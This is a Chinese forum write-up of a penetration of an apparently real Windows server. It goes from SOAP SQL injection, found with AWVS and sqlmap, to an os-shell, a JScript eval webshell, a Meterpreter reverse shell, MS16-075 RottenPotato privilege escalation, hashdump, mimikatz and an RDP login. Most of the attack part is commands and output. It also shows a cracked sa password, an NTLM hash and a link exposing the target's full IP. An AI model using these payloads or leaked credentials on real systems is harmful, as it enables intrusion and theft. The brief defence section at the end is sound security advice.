[原文作者：陈小兵](https://bbs.ichunqiu.com/thread-41278-1-1.html?from=beef)

  

在实际成功渗透过程中，漏洞的利用都是多个技术的融合，最新技术的实践，本次渗透利用sqlmap来确认注入点，通过sqlmap来获取webshell，结合msf来进行ms16-075的提权，最终获取了目标服务器的系统权限。本文算是漏洞利用的一个新的拓展，在常规Nday提权不成功的情况下，结合msf进行ms16-075成功提权的一个经典案例。

  

1.1.1扫描soap注入漏洞  

1.使用awvs中的web services scanner进行漏洞扫描 打开awvs，选择web services
scanner进行漏洞扫描，如图1所示，在wsdl
url中填写目标url地址，注意一定是asmx?wsdl，有的是有asmx文件，如果没有则可以直接填写，例如：[http://1**.***.***.***:8081/?wsdl](http://139.224.206.115:8081/?wsdl)。  

  
![image.png](https://image.3001.net/images/20180605/15281863107285.png!small)  

图1进行soap注入漏洞扫描

2.处理sql盲注

通过awvs扫描，确认该url地址存在sql盲注（26处），在awvs中，单击右边的“view http
headers”，将其内容复制到一个文本文件中，同时处理存在漏洞的语句，在本例中例如：

![image.png](https://image.3001.net/images/20180605/15281863358720.png!small)  
需要将红色字图部分更换为”-1*”。

3.完整的header包中内容如下：

POST /Service1.asmx HTTP/1.1

Content-Type: text/xml

SOAPAction: "http://tempuri.org/ZcpdList"

Content-Length: 716

X-Requested-With: XMLHttpRequest

Referer: http://1**.***.***.***:8081/?wsdl

Host: 1**.***.***.***:8081

Connection: Keep-alive

Accept-Encoding: gzip,deflate

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML,
like Gecko) Chrome/41.0.2228.0 Safari/537.21

Accept: */*

<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
xmlns:xsd="http://www.w3.org/1999/XMLSchema"
xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"
xmlns:m0="http://tempuri.org/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
xmlns:urn="http://tempuri.org/" xmlns:urn2="http://tempuri.org/AbstractTypes">

<SOAP-ENV:Header/>

<SOAP-ENV:Body>

<urn:ZcpdList>

<urn:Inventory_dhs>

<urn:string>-1*</urn:string>

</urn:Inventory_dhs>

</urn:ZcpdList>

</SOAP-ENV:Body>

</SOAP-ENV:Envelope>

Response

  

1.1.2确认soap注入漏洞

1.使用sqlmap检测是否存在sql注入漏洞
将前面的header中的内容保存为1**.***.***.***.txt，将该文件复制到sqlmap.py程序所在目录，执行命令：sqlmap.py -r
1**.***.***.***.txt，对sqlmap提示的信息进行确认：  

custom injection marker ('*') found in option '--data'. Do you want to process
it? [Y/n/q] [color=Red]y[/color]

SOAP/XML data found in POST data. Do you want to process it?
[Y/n/q][color=Red]y[/color]

  

如图2所示，sqlmap确认该sql注入漏洞存在，且该数据库服务器为windows 2008 R2，数据库版本为sql server
2008，soap存在漏洞为union查询。

  
![image.png](https://image.3001.net/images/20180605/15281863799135.png!small)  

图2 存在soap注入漏洞

2.查看数据库是否dba权限（1）自动提交参数进行测试如图3所示，执行命令：sqlmap.py -r 1**.***.***.***.txt --is-dba --batch后，也要两次确认y，由于使用了参数“batch”，sqlmap会自动进行提交判断值。

  

![image.png](https://image.3001.net/images/20180605/15281863853554.png!small)  

图3自动提交参数进行判断

（2）获取当前数据库使用的用户是dba账号。
如图4所示，在sqlmap中获取当前用户是dba，显示结果为true。该结果表明数据库是使用sa权限，可以通过os-shell参数来获取webshell。

![image.png](https://image.3001.net/images/20180605/15281864024224.png!small)  

图4判断是否为dba账号

3.获取sa账号密码

如图5所示，使用命令sqlmap.py -r 1**.***.***.***.txt --password
--batch直接获取该数据库连接的所有账号对应的密码值：

  
![image.png](https://image.3001.net/images/20180605/1528186409628.png!small)  

图5获取sa账号密码

4.破解sa账号密码 在前面通过sqlmap成功获取其数据库密码哈希值：

##MS_PolicyEventProcessingLogin## [1]:

password hash: 0x01001a7b0c5b5b347506dbc67aa8ffa2ad20f852076d8446a838
##MS_PolicyTsqlExecutionLogin## [1]:

password hash: 0x01006c6443e1e42ca27773d413042ee8af2eea9026d44c8d4d1c sa [1]:

  

password hash: 0x0100b7b90b706f339288fb0ab4c8a099c4de53045d2de6297e28
将sa对应的密码值“0x0100b7b90b706f339288fb0ab4c8a099c4de53045d2de6297e28”在www.cmd5.com进行查询，如图6所示，其解密结果为“qaz123WSX”。

![image.png](https://image.3001.net/images/20180605/15281864287357.png!small)  

图6解密sa密码哈希值

1.1.3通过--os-shell获取webshell1.获取os-shell在sqlmap中执行命令：sqlmap.py -r
1**.***.***.***.txt --os-shell，在sqlmap执行窗口中确认信息：

  
![image.png](https://image.3001.net/images/20180605/15281864713532.png!small)  

也可以执行sqlmap.py -r 1**.***.***.***.txt --os-shell --batch命令不用手工输入。

  

2.寻找web程序所在目录

（1）查看文件及目录

执行dir c:\命令后，可以查看c目录及文件，继续查看“dir c:\inetpub\wwwroot”如图7所示，在该文件夹中无web程序，排除该目录。

  

![image.png](https://image.3001.net/images/20180605/15281864812221.png!small)  

图7查看文件及目录

（2）获取网站真实目录 通过依次查看c、d、e、f盘，在e盘获取疑似网站程序文件，使用命令进行查看dir
e:\software\AMS_NoFlow，如图8所示。

![image.png](https://image.3001.net/images/20180605/15281864897339.png!small)  

图8查看网站文件

3.测试网站真实目录  

（1）生成文件测试 如图9所示，使用echo命令：echo "thisis
test">e:\software\AMS_NoFlow\t.txt，在网站根目录下生成t.txt文件。内容为thisis test。

![image.png](https://image.3001.net/images/20180605/15281865046871.png!small)  

图9生成文件

（2）网站访问测试

在浏览器中输入地址http://1**.***.***.***/1.txt进行测试，如图10所示，获取内容跟预期一致，该目录为网站真实物理地址。

![image.png](https://image.3001.net/images/20180605/15281865118204.png!small)  

图10网站访问测试

4\. 获取web.config配置文件内容  

在os-shell中，执行type
e:\software\AMS_NoFlow\web.config命令查看web.config文件中的内容，在sqlmap命令窗口由于设置问题，可能无法查看其完整的内容，不过sqlmap在其output目录下，会保持详细情况，如图11所示，打开其log文件，可以看到其sa账号对应的密码为qaz123WSX，跟前面破解的sa密码一致。

![image.png](https://image.3001.net/images/20180605/1528187202830.png!small)  

图11查看web.config配置文件内容

5.获取ip地址信息  

如图12所示，在os-shell中执行ipconfig命令，即可获取该目标的IP地址配置情况，该目标对外配置独立外网IP和内网IP地址，在os-shell中还可以执行其它命令。

![image.png](https://image.3001.net/images/20180605/15281872086557.png!small)  

图12获取IP地址

6\. 获取webshell测试

（1）生成shell文件

在os-shell中执行命令：

echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^>
> e:\software\AMS_NoFlow\cmd.aspx  

  

如图13所示，回显结果显示1，无其它信息，表面生成文件命令成功。

  
![image.png](https://image.3001.net/images/20180605/15281872274492.png!small)  

图13 生成webshell  

  

（2）获取webshell
使用中国菜刀后门管理工具，创建记录http://1**.***.***.***/cmd.aspx，一句话后门密码：pass，如图14所示，连接成功，成功获取webshell。

  
![image.png](https://image.3001.net/images/20180605/15281872362181.png!small)  

图14获取webshell

1.1.4常规方法提权失败

1.生成系统信息文件 在os-shell中执行命令：

![image.png](https://image.3001.net/images/20180605/1528187248958.png!small)  

2.下载Windows-Exploit-Suggester程序Windows-Exploit-Suggester下载地址：https://github.com/GDSSecurity/Windows-Exploit-Suggester/

3.更新漏洞库并进行漏洞比对 在python中执行windows-exploit-suggester.py
-u进行更新，同时对漏洞库进行比对：windows-exploit-suggester.py --audit -l --database
2018-06-04-mssb.xls --systeminfo SYD1-0081DSB.txt > SYD1-0081DSB-day.txt，如图15所示。

  
![image.png](https://image.3001.net/images/20180605/15281872559616.png!small)  

图15进行漏洞比对

4.查看漏洞情况 在C:\Python27目录打开SYD1-0081DSB-day.txt文件，如图16所示，可以看到程序判断该操作系统为windows
2008 R2版本，且存在多个漏洞，最新漏洞为ms16-075。

  
![image.png](https://image.3001.net/images/20180605/15281872623994.png!small)  

图16查看漏洞情况

  

5.对存在的漏洞进行提权测试 按照漏洞编号，查找并整理exp文件，在目标服务器上进行提权测试，除ms16-075exp外，测试均失败，无法提权。

1.1.5借助msf进行ms16-075提权

1.使用msf生成反弹木马

在msf下面执行命令：

  
![image.png](https://image.3001.net/images/20180605/15281872746368.png!small)  

其中windows/meterpreter/reverse_tcp反弹端口类型，lhost是反弹连接的服务器Ip地址，注意该ip地址必须是独立服务器，或者必须是外网端口映射，换句话说，就是反弹必须能够接收，lport为反弹的端口，4433为生成的程序。

2.在监听服务器上执行监听命令

（1）启动msf

msfconsole

（2）配置meterpreter参数

  
![image.png](https://image.3001.net/images/20180605/15281872899078.png!small)  

3.上传4433.exe程序到目标服务器及执行

将4433.exe文件上传到目标服务器，并通过中国彩刀或者os-shell进行执行。

4.查看系统信息

如图17所示，目标反弹到监听服务器上，执行sysinfo，获取其系统信息。

![image.png](https://image.3001.net/images/20180605/15281873014266.png!small)  

图17获取系统信息

5.使用meterpreter自带提权功能失败

在meterpreter中分别执行getuid和getsystem命令，如图18所示，未能成功提权。

  
![image.png](https://image.3001.net/images/20180605/15281873143934.png!small)  

图18使用默认meterpreter提权失败

6.使用ms16-075进行提权

（1）ms16-075可利用exp下载<https://github.com/foxglovesec/RottenPotato>

（2）上传potato文件

通过webshell上传potato.exe文件，或者在msf下面执行命令上传：upload /root/potato.exe

  

（3）获取系统权限 依次执行以下命令：

  
![image.png](https://image.3001.net/images/20180605/15281874391532.png!small)  

如图19所示，成功获取系统权限。

![image.png](https://image.3001.net/images/20180605/15281874307702.png!small)  

图19获取系统权限tokens

（4）获取系统权限分别执行命令：

  
![image.png](https://image.3001.net/images/20180605/15281874498325.png!small)  

如图20所示，成功获取系统权限。

  
![image.png](https://image.3001.net/images/20180605/15281874574239.png!small)  

图20获取系统权限  

  

（5）获取密码  

在meterpreter下执行命令：run
hashdump命令，如图21所示，成功获取该服务器密码哈希值：Administrator:500:aad3b435b51404eeaad3b435b51404ee:a59a64a645487c1581dea603253c7920:::

![image.png](https://image.3001.net/images/20180605/15281874649508.png!small)  

图21获取密码  

  

在本例中还是用load
mimikatz进行明文密码获取，但获取效果不理想，执行命令：kerberos、livessp、msv、ssp、tspkg、wdigest获取不到明文密码，还可以执行命令mimikatz_command，进入mimikatz命令提示符下进行操作。  

  

（6）破解ntml密码 将ntml密码哈希值a59a64a645487c1581dea603253c7920复制到cmd5.com进行破解，
cmd5需要付费，还可以到：<http://www.objectif-securite.ch/en/ophcrack.php>和https://www.somd5.com/网站 进行密码破解，如图22所示，成功破解密码。

  
![image.png](https://image.3001.net/images/20180605/15281874717573.png!small)  

图22破解ntlm哈希值

7.登录服务器 通过nmap -sS -Pn -A 1**.***.***.***或者masscan -p 1-65535
1**.***.***.***进行端口扫描，发现该服务器开放3389端口，使用mstsc进行登录，如图23所示，成功登录该服务器。

  
![image.png](https://image.3001.net/images/20180605/15281874781779.png!small)  

图23成功登录服务器

  

1.1.6总结与防御

1.本次渗透主要命令汇总  

  

（1）sqlmap执行命令

![image.png](https://image.3001.net/images/20180605/15281874864626.png!small)  

（2）os-shell下执行命令

  
ipconfigdir c:/echo "thisis test">e:\software\AMS_NoFlow\t.txtecho ^<%@ Page
Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> >
e:\software\AMS_NoFlow\cmd.aspx  

  

（3）msf下执行命令生成反弹木马：

![image.png](https://image.3001.net/images/20180605/15281875047011.png!small)

（4）msf启动及监听

  
msfconsoleuse exploit/multi/handlerset PAYLOAD
windows/meterpreter/reverse_tcpset LHOST 192.168.1.33（实际为外网IP地址）set LPORT
4433exploit  

  

（5）ms16-075提权命令

  
use incognitolist_tokens -uexecute -cH -f ./potato.exelist_tokens -u
impersonate_token "NT AUTHORITY\\\SYSTEM"getuid  

  

（6）获取密码run hashdump  

  

（7）mimikatz进行密码获取  

load
mimikatzkerberos、livessp、msv、ssp、tspkg、wdigest（逐个命令测试，有的会显示明文密码）mimikatz_command：mimikatz命令提示窗口

（8）mimikatz命令行下获取密码（未做测试）

![image.png](https://image.3001.net/images/20180605/15281875437029.png!small)

  

2.渗透总结  

  

在本次渗透中，通过sqlmap进行soap注入测试，通过sqlmap判断sql注入点可用，后续通过os-shell成功获取了webshell。获取webshell后，尝试通过常规的Nday提权方法，结果失败，后续通过msf配合进行ms16-075进行提权。Windows-Exploit-Suggester进行本地漏洞的判断和测试效果还是可以的，通过其审计，使用最新漏洞进行提权，基本命中率在99%。

3.安全防御  

  

成功渗透该服务器后，在该服务器上未发现有任何[安全防护](https://bbs.ichunqiu.com/thread-41278-1-1.html?from=beef)软件，笔者根据经验，建议做如下安全防御：

（1）对soap参数进行过滤，过滤危险的一些导致sql注入的参数。  

（2）mssql数据库使用低权限用户进行数据库连接。  

（3）服务器定期进行补丁更新升级。  

（4）安装杀毒软件、waf及硬件防火墙，增加攻击成本和难度

i春秋推出优享会员制，开通会员可以免费畅享多类课程、实验、CTF赛题等付费内容，并可享有包括会员日专属福利、就业推荐等多种特权福利，更多活动详情可点击：[https://bbs.ichunqiu.com/thread-40795-1-1.html](https://bbs.ichunqiu.com/thread-40795-1-1.html?from=qd)了解哦~  

